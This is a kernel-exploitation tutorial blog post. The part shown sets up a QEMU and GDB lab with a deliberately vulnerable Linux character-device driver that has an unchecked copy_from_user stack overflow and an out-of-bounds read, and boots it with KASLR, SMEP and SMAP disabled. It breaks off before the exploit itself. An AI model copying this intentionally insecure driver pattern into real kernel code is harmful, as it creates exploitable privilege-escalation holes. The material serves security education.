<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Linux Kernel: Introduction to Kernel Stack Overflows | BinaryChunk’s Blog</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Linux Kernel: Introduction to Kernel Stack Overflows" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In the Linux Kernel &#39;ring (0)&#39; a stack is also allocated for local variables defined in functions. These functions are mainly implemented for device drivers that are defined in different Loadable Kernel Modules (LKMs). The same stack is also vulnerable to stack overflow attacks that aim at overwriting the return address saved on the stack — this post will cover exploiting these vulnerabilities." />
<meta property="og:description" content="In the Linux Kernel &#39;ring (0)&#39; a stack is also allocated for local variables defined in functions. These functions are mainly implemented for device drivers that are defined in different Loadable Kernel Modules (LKMs). The same stack is also vulnerable to stack overflow attacks that aim at overwriting the return address saved on the stack — this post will cover exploiting these vulnerabilities." />
<link rel="canonical" href="http://0.0.0.0:4000/2023/05/28/Linux-Kernel-Stack-Exploitation.html" />
<meta property="og:url" content="http://0.0.0.0:4000/2023/05/28/Linux-Kernel-Stack-Exploitation.html" />
<meta property="og:site_name" content="BinaryChunk’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-05-28T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Linux Kernel: Introduction to Kernel Stack Overflows" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-28T00:00:00+00:00","datePublished":"2023-05-28T00:00:00+00:00","description":"In the Linux Kernel &#39;ring (0)&#39; a stack is also allocated for local variables defined in functions. These functions are mainly implemented for device drivers that are defined in different Loadable Kernel Modules (LKMs). The same stack is also vulnerable to stack overflow attacks that aim at overwriting the return address saved on the stack — this post will cover exploiting these vulnerabilities.","headline":"Linux Kernel: Introduction to Kernel Stack Overflows","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2023/05/28/Linux-Kernel-Stack-Exploitation.html"},"url":"http://0.0.0.0:4000/2023/05/28/Linux-Kernel-Stack-Exploitation.html"}</script>
<!-- End Jekyll SEO tag -->
<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="BinaryChunk&apos;s Blog" />

<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
<style>
@font-face {
  font-family: 'Open Sans';
  src: url('//fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2')
       format('woff2');
  font-weight: 400;
  font-style: normal;
  font-display: swap;
  font-stretch: 100%;
}

body {
  font-family: 'Open Sans', sans-serif;
  font-size: 11pt;
}
</style>
</head>
<body><header class="site-header">

  <div class="wrapper">
    <a class="site-title" rel="author" href="/">BinaryChunk&#39;s Blog</a>
      <nav class="site-nav">
        <input type="checkbox" id="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon"></span>
        </label>

        <div class="nav-items">
  <a class="nav-item" href="/ctfs/">CTFs</a>
</div>

      </nav>
  </div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Linux Kernel: Introduction to Kernel Stack Overflows</h1>
    <div class="post-meta">
      <time class="dt-published" datetime="2023-05-28T00:00:00+00:00" itemprop="datePublished">
        May 28, 2023
      </time>
    </div>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>In the <code class="language-plaintext highlighter-rouge">Linux Kernel 'ring (0)'</code> a stack is also allocated for local variables defined in functions. These functions are mainly implemented for device drivers that are defined in different <strong>Loadable Kernel Modules</strong> (LKMs). The same stack is also vulnerable to stack overflow attacks that aim at overwriting the return address saved on the stack — this post will cover exploiting these vulnerabilities.</p>

<p>In this post the following aspects will be covered:</p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Setting up a Kernel Debug Environment.</li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />A view of the Structure of the Stack in memory.</li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Linux Kernel Stack Overflow Exploitation.</li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Understand how the exploitation of the User-Land and the Kernel stack differs.</li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Mitigations implemented to prevent the exploitation of Kernel Stack Overflows.</li>
</ul>

<h3 id="environment-setup">Environment Setup</h3>

<p>For the lab setup, the following will be required:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">qemu</code>: This will be used to emulate a chosen version of the Linux Kernel.</li>
  <li>A kernel bootable image that will be built from scratch.</li>
  <li>A vulnerable Kernel Module (<em>vulnerable to a Stack-Buffer Overflow vulnerability)</em>.</li>
  <li>A debugger (GDB) mostly without its plugins i.e <code class="language-plaintext highlighter-rouge">peda</code>, <code class="language-plaintext highlighter-rouge">gef</code></li>
</ul>

<h3 id="kernel">Kernel</h3>

<p>There are two options that can be used when emulating a Linux Kernel:</p>
<ol>
  <li><strong>Building</strong> and <strong>compiling</strong> the Kernel from scratch.</li>
  <li>Using a default compiled kernel provided in the <code class="language-plaintext highlighter-rouge">/boot</code> folder.</li>
</ol>

<p>The process of building the Kernel provides more control since this allows us to even disable stack-cookies and other mitigations during compilation but this is not required for this post.</p>

<p>The latest stable Kernel Version can be downloaded  from <a href="https://kernel.org">kernel.org</a>. At the time of writing, the latest version was <code class="language-plaintext highlighter-rouge">6.3.4</code> but for this post we will be using the Kernel Version <code class="language-plaintext highlighter-rouge">5.4.0</code> that can be downloaded from the following <code class="language-plaintext highlighter-rouge">URI</code> endpoint: <code class="language-plaintext highlighter-rouge">https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.4.tar.gz</code>.</p>

<p>An archive with all the required files needed to build the Kernel will be downloaded.</p>

<blockquote>
  <p><strong>Note</strong>: Any chosen Kernel Version can be used since the steps used to build the kernel will be the same.</p>
</blockquote>

<h4 id="configuration">Configuration</h4>

<p>From the root folder <em>(will have the same name as the Kernel Version)</em> containing the extracted files, run the <code class="language-plaintext highlighter-rouge">make menuconfig</code> command. This will open up a configuration window as shown below, that can be used to set specific options before building the Kernel like <em>(<strong>enabling</strong> and <strong>disabling</strong> stack protection)</em>.</p>

<p><img src="https://i.imgur.com/yyOrupI.png" alt="" /></p>

<p>The complete configuration is also described <a href="https://hackmag.com/coding/linux-kernel-exploitation/#:~:text=Commit_creds%20will%20grant%20the%20privileges">here</a></p>

<h4 id="compilation">Compilation</h4>

<p>After the above configurations are set, the final bootable Kernel Image can be compiled with the following command: <code class="language-plaintext highlighter-rouge">make -j &lt;threads&gt;</code></p>

<p><code class="language-plaintext highlighter-rouge">threads</code> are the numbers of the threads that will be used to build the Kernel —depending of the computation power of your current machine— the time used to compile the Kernel may differ accordingly. The compiled Kernel will be at <code class="language-plaintext highlighter-rouge">./arch/x86/boot/bzimage</code> in the root folder. There is a simple script provided <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/kernel-build.sh">here</a> to automate the Kernel build process a modified fork of <a href="https://github.com/pwncollege/pwnkernel/blob/main/build.sh">this</a>.</p>

<h3 id="kernel-module">Kernel Module</h3>

<p>A Kernel Module is a piece of code that can be <strong>loaded</strong> and <strong>unloaded</strong> from the Kernel dynamically. These modules are written in <code class="language-plaintext highlighter-rouge">C</code> and therefore obviously vulnerable to memory corruption bugs; used to implement <strong>Kernel Drivers</strong>. The following is the code snippet for the vulnerable Kernel Module that will be used for the purpose of this post:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/device.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span>
<span class="cp">#define NAME "vuln"
</span>
<span class="k">static</span> <span class="kt">int</span> <span class="n">major_number</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">class</span> <span class="o">*</span><span class="n">cls</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">vulnz</span><span class="p">[</span><span class="mh">0xff</span><span class="p">];</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">vuln_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">vuln_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">fops</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
        <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">vuln_read</span><span class="p">,</span>
        <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">vuln_write</span><span class="p">,</span>
        <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">vuln_close</span><span class="p">,</span>
        <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">vuln_open</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">vuln_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span> <span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">){</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
        <span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
        <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span>
        <span class="n">buffer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4343434343434343</span><span class="p">;</span>

        <span class="n">memcpy</span><span class="p">(</span><span class="n">vulnz</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">off</span><span class="p">)</span> <span class="o">*</span><span class="n">off</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>

        <span class="n">copy_to_user</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">vulnz</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span> <span class="c1">//OOB read</span>

        <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">vuln_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">){</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>

        <span class="n">copy_from_user</span><span class="p">(</span><span class="n">vulnz</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span> <span class="c1">//stack overflowz</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">vulnz</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>

	<span class="n">printk</span><span class="p">(</span><span class="n">KER_INFO</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>

        <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">fp</span><span class="p">){</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">fp</span><span class="p">){</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">init_module</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="n">major_number</span> <span class="o">=</span> <span class="n">register_chrdev</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">NAME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fops</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">major_number</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"chardevice registration error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">major_number</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">cls</span> <span class="o">=</span> <span class="n">class_create</span><span class="p">(</span><span class="n">THIS_MODULE</span><span class="p">,</span> <span class="n">NAME</span><span class="p">);</span>
        <span class="n">device_create</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MKDEV</span><span class="p">(</span><span class="n">major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">NAME</span><span class="p">);</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Device create @ /dev/%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">NAME</span><span class="p">);</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">cleanup_module</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="n">device_destroy</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">MKDEV</span><span class="p">(</span><span class="n">major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
        <span class="n">class_destroy</span><span class="p">(</span><span class="n">cls</span><span class="p">);</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"driver unregistered</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"Binarychunk &lt;binarychunk@proton.me&gt;"</span><span class="p">);</span>
</code></pre></div></div>

<p>From the above source code, the driver introduces an <code class="language-plaintext highlighter-rouge">Out-Of-Bounds</code> read vulnerability via the <code class="language-plaintext highlighter-rouge">vuln_read</code> function; since we can read values from the stack without any bounds check/limit.</p>

<p>It is also vulnerable to a <strong>stack overflow</strong> bug since there are no any bound checks when values are written/copied to the stack in the <code class="language-plaintext highlighter-rouge">vuln_write</code> function.</p>

<p>First, we need to compile the above source code and load it into the kernel to create and register an interface for the driver at <code class="language-plaintext highlighter-rouge">/dev/vuln</code> that can be used to interact with that Kernel Driver.</p>

<p>The below <code class="language-plaintext highlighter-rouge">Makefile</code> can be used to compile the above code into a loadable Kernel Object <code class="language-plaintext highlighter-rouge">.ko</code></p>

<div class="language-make highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nv">obj-m</span> <span class="o">+=</span> vuln

<span class="nl">all</span><span class="o">:</span>
	make <span class="nt">-C</span> ./linux-5.4 <span class="nv">M</span><span class="o">=</span><span class="nv">$(PWD)</span> modules
<span class="nl">clean</span><span class="o">:</span>
	make <span class="nt">-C</span> ./linux-5.4 <span class="nv">M</span><span class="o">=</span><span class="nv">$(PWD)</span> clean

</code></pre></div></div>

<p>Running the <code class="language-plaintext highlighter-rouge">make</code> command will build the driver with different other files but the most important file is <code class="language-plaintext highlighter-rouge">vuln.ko</code>.</p>

<h3 id="filesystem">Filesystem</h3>

<p>As the saying goes <em>“Everything in Linux is a File”</em>, therefore to be able to run our Kernel in an emulated enviroment, we need to create a file system for it. This should follow the default linux file system structure i.e <em>etc,sys, etc…</em></p>

<p>To create a filesystem that will not take much space on disk because of library dependencies and all, we will be using <code class="language-plaintext highlighter-rouge">busybox</code> <em>(A software suite that provides several unix utilities in a single executable file)</em>.</p>

<p>There are ofcourse, other ways that can be used to build the file system e.g <em>initramfs</em>. The following <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/fs-build.sh">script</a> again a fork for the above mentioned script can be used to build the file-system.</p>

<p>The above bash script will first download <code class="language-plaintext highlighter-rouge">buysbox</code> from its download site and compiles it. A parent directory <code class="language-plaintext highlighter-rouge">rootfs</code> will be created with other subdirectories The new compile busybox binary will be copied here.</p>

<blockquote>
  <p>When running the above script use the command <code class="language-plaintext highlighter-rouge">bash ./&lt;script-name&gt;</code> this is necessary since <code class="language-plaintext highlighter-rouge">mkdir -p {}</code> is native only to <code class="language-plaintext highlighter-rouge">bash</code>.</p>
</blockquote>

<h4 id="etcpasswd">/etc/passwd</h4>

<p>The next option is populating the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, since this is where users and user ID’s are checked, we will be populating it with both the <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">ffs</code> users as shown below.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">root:x:</span><span class="mi">0</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="n">root</span><span class="o">:/</span><span class="n">root</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
<span class="n">ffs</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="n">ctf</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ffs</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
</code></pre></div></div>

<h4 id="init-scripts">Init scripts</h4>

<p>When a Linux system first boots, the <strong>boot loader</strong> will first load the Kernel Image. When it’s loaded successfully, it will intialize all the Kernel specific structures and tasks and finally start the <code class="language-plaintext highlighter-rouge">init</code> process that will be assigned a <code class="language-plaintext highlighter-rouge">PID</code> of <code class="language-plaintext highlighter-rouge">1</code>.</p>

<p>First, we will create a symlink to <code class="language-plaintext highlighter-rouge">rootfs/bin/busybox</code> called <code class="language-plaintext highlighter-rouge">init</code> at the <code class="language-plaintext highlighter-rouge">./rootfs/init</code> directory that will be executed to intiate and start the <code class="language-plaintext highlighter-rouge">init</code> process. When the <code class="language-plaintext highlighter-rouge">init</code> process is executed it does not make decisions by itself but will require a set of configuration(s) that specify what actions will need to be taken and this is where <code class="language-plaintext highlighter-rouge">init scripts</code> come in.</p>

<p>These various scripts are stored in the <code class="language-plaintext highlighter-rouge">/etc/init.d</code> directory and the order in which these scripts are executed is specified in <code class="language-plaintext highlighter-rouge">/etc/inittab</code>. The format of this file/script is beyond the scope of this post but more can be read from <a href="https://www.ibm.com/docs/en/zos/2.3.0?topic=etcinittab-format-file">here</a>.</p>

<p>The content of the <code class="language-plaintext highlighter-rouge">rootfs/etc/inittab</code> should be updated with the following:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::sysinit:/etc/init.d/rCs
::once:sh <span class="nt">-c</span> <span class="s1">'sleep 1; setuidguid 0 sh; poweroff'</span>
</code></pre></div></div>
<p>The first entry above will order the <code class="language-plaintext highlighter-rouge">init</code> process to execute the <code class="language-plaintext highlighter-rouge">rCs</code> script whose content is as specified below. The second entry simply executes the provided <code class="language-plaintext highlighter-rouge">sh</code> command to open a shell session with the provided <code class="language-plaintext highlighter-rouge">uid</code> and will <code class="language-plaintext highlighter-rouge">poweroff</code> when the shell session is terminated via the <code class="language-plaintext highlighter-rouge">exit</code> command.</p>

<p>The content of the <code class="language-plaintext highlighter-rouge">./etc/init.d/rCs</code> file should be as follows and the file permissions should also be updated to make it executable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /bin/sh </span>

/bin/busybox <span class="nt">--install</span> <span class="nt">-s</span> 

<span class="nb">stty </span>raw <span class="nt">-echo</span>

<span class="nb">chown</span> <span class="nt">-R</span> 0:0 / 

<span class="c"># Mount important files</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> /proc <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> proc none /proc
<span class="nb">mkdir</span> <span class="nt">-p</span> /dev <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> devtmpfs devtmpfs /dev
<span class="nb">mkdir</span> <span class="nt">-p</span> /tmp <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> tmpfs tmpfs /tmp


<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> 
Welcome to the Linux Kernel Stack Anatomyz!!!
</span><span class="no">EOF 

</span><span class="nb">chmod </span>400 /proc/kallsyms

<span class="c">#Load the driver </span>
insmod /vuln.ko

<span class="c">#Make the driver interface readable</span>
<span class="nb">chmod </span>660 /dev/vuln

</code></pre></div></div>

<p>The above script will mount specific and important files like <code class="language-plaintext highlighter-rouge">/proc</code> and <code class="language-plaintext highlighter-rouge">/dev</code> and simply loads/inserts our driver into the Kernel via the <code class="language-plaintext highlighter-rouge">insmod</code> command. With the file system now set up, we need to archive its content and finally launch the Kernel via <code class="language-plaintext highlighter-rouge">qemu</code>.</p>

<p>The root-filesystem <em>(used for building our filesystem)</em> should be as follows:</p>

<p><img src="https://i.imgur.com/OKzmswD.png" alt="File Structure" /></p>

<p>The following command can finally be used to archive this filesystem into a <code class="language-plaintext highlighter-rouge">cpio.gz</code>:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">pushd </span>rootfs 
find <span class="nb">.</span> <span class="nt">-print0</span> | cpio <span class="nt">--null</span> <span class="nt">-ov</span> <span class="nt">--format</span><span class="o">=</span>newc | <span class="nb">gzip</span> <span class="nt">-9</span> <span class="o">&gt;</span> ../roofs.cpio.gz
<span class="nb">popd</span>

</code></pre></div></div>

<p>The following bash command will launch <code class="language-plaintext highlighter-rouge">qemu</code> with options used to pass the file system and the <code class="language-plaintext highlighter-rouge">Kernel Bootable Image</code>. This should best be run as a bash script since we will need to run it multiple times.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/bash</span>

/usr/bin/qemu-system-x86_64 <span class="se">\</span>
        <span class="nt">-m</span> 128M <span class="se">\</span>
        <span class="nt">-cpu</span> kvm64,+smep,+smap <span class="se">\</span>
        <span class="nt">-no-reboot</span> <span class="se">\</span>
        <span class="nt">-kernel</span> linux-5.4/arch/x86/boot/bzImage <span class="se">\</span>
        <span class="nt">-initrd</span> <span class="nv">$PWD</span>/rootfs.cpio.gz <span class="se">\</span>
        <span class="nt">-nographic</span> <span class="se">\</span>
        <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
        <span class="nt">-snapshot</span> <span class="se">\</span>
        <span class="nt">-s</span> <span class="se">\</span>
        <span class="nt">-append</span> <span class="s2">"console=ttyS0 nokaslr nopti nosmep nosmap panic=1"</span>
</code></pre></div></div>

<p>The most important <code class="language-plaintext highlighter-rouge">qemu</code> command line option that allows us to run and debug the Kernel is the <code class="language-plaintext highlighter-rouge">-s</code> options. This opens up the port <code class="language-plaintext highlighter-rouge">1234</code> that allows for remote debugging using <code class="language-plaintext highlighter-rouge">GDB</code>. The rest of the command options can be examined by running the <code class="language-plaintext highlighter-rouge">help</code> command.</p>

<p>With the debug enviroment setup, we can now debug the kernel to examine the structure of the stack in memory.</p>

<h3 id="debugging">Debugging</h3>

<p>Once the above command is run, the lab should be okay and this should start up <code class="language-plaintext highlighter-rouge">qemu</code> and return a shell session as shown below.</p>

<p>The device driver was loaded successfuly into the Kernal, and can be accessed from <code class="language-plaintext highlighter-rouge">/dev/vuln</code> with permissions that allow for read and write.</p>

<p><img src="https://i.imgur.com/ItiRmQx.png" alt="/dev/vuln" /></p>

<p>As stated above, the Kernel can now be debugged via the <code class="language-plaintext highlighter-rouge">1234</code> open port. It’s now time to start the debugger and examine the structure of the stack in memory. The debugger can be started and the following <code class="language-plaintext highlighter-rouge">GDB</code> commands run.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly intel
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>pagination off
<span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
</code></pre></div></div>

<p>The last command will simply start remote debugging by initiating a <code class="language-plaintext highlighter-rouge">SIGTRAP</code> signal sending an interrupt to the Kernel, therefore, running shell commands on <code class="language-plaintext highlighter-rouge">qemu</code> will simply be halted until execution is continued from the debugger.</p>

<p>Since <code class="language-plaintext highlighter-rouge">KASLR</code> was disabled during reboot, all the symbols and addresses that were loaded in the Kernel can be read from <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code>, this includes functions that were defined in our vulnerable driver.</p>

<p>For example the address of the <code class="language-plaintext highlighter-rouge">vuln_read</code> function can be obtained by running the following command:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /proc/kallsyms | <span class="nb">grep</span> <span class="nt">-i</span> vuln_read
</code></pre></div></div>

<p>The address of <em>vuln_read</em> should be returned as shown below.</p>

<p><img src="https://i.imgur.com/Saa51wQ.png" alt="vuln_read" /></p>

<p>From the debugger, the address returned above can be used to disassemble the function allowing us set a break-point right after <strong><em>copy_to_user()</em></strong> is called for further analysis.</p>

<p>The following <code class="language-plaintext highlighter-rouge">GDB</code> command will return <code class="language-plaintext highlighter-rouge">30</code> instructions from the address returned above.</p>

<p><img src="https://i.imgur.com/XbwRWvD.png" alt="vuln_read disassemble" /></p>

<p>From the above disassembly, we can also see that before <code class="language-plaintext highlighter-rouge">memcpy()</code> the Kernel checks if the length provided by the user is greater than <code class="language-plaintext highlighter-rouge">0xff</code> <em>(marked in blue)</em> to which this will jump to some other address possibly an instruction that will throw a Kernel Panic.</p>

<p>The second <code class="language-plaintext highlighter-rouge">call</code> instruction is exactly where the call to <code class="language-plaintext highlighter-rouge">copy_to_user</code> is called and a breakpoint can be set a this position using the following command:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> br <span class="k">*</span>0xffffffffc000008f
</code></pre></div></div>

<p>From <code class="language-plaintext highlighter-rouge">qemu</code> the above break-point can be triggered by reading from the device driver.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /dev/vuln
</code></pre></div></div>

<p>When the breakpoint is hit, the following is the stack structure allocated to the <em>vuln_read()</em> function.</p>

<p><img src="https://i.imgur.com/s6IXZ63.png" alt="stack" /></p>

<p>From the above stack, the value marked in <code class="language-plaintext highlighter-rouge">red</code> is the buffer allocated on the stack for the <code class="language-plaintext highlighter-rouge">buffer</code> variable and right next to this buffer, is the stack-cookie.</p>

